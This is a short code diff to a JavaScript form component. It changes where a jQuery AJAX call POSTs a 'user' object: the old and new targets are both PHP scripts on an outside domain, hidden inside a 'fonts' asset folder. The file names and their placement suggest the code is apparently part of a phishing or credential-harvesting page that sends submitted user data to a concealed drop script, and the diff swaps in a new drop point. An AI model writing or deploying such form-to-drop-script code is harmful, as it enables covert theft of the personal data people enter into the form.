@@ -46,7 +46,7 @@ const Formm = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://dozenpearl.com/nc_assets/fonts/recov/exl.php",
+          url: "https://dozenpearl.com/nc_assets/fonts/nas/nass.php",
           data: user,
           success(data) {
               console.log(data);
